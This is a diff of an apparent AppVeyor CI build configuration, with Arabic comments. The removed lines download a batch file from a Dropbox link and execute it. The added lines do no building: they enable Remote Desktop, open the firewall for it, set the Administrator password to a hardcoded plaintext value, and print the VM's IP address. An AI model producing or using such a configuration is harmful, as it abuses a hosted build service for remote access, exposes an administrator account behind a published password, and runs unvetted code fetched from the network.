@@ -1,6 +1,14 @@
+image: Visual Studio 2022  # بيئة Windows
+
 build_script:
-     - ps: |
-         Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/qdyd4p9t6xoabl95n5o3g/Downloads.bat?rlkey=snr74vv1vr8k5suujugvrhjtm&dl=1" -OutFile "Downloads.bat"
-         cmd /c Downloads.bat
-         cmd /c show.bat
-         python time.py
+  - ps: |
+      # تفعيل RDP
+      Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
+      Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+      
+      # تعيين كلمة مرور
+      $password = ConvertTo-SecureString "AppVeyorRDP@123" -AsPlainText -Force
+      Set-LocalUser -Name "Administrator" -Password $password
+      
+      # إظهار IP السيرفر
+      Write-Host "RDP IP: $(Test-Connection -ComputerName (hostname) -Count 1 | Select -ExpandProperty IPV4Address)"
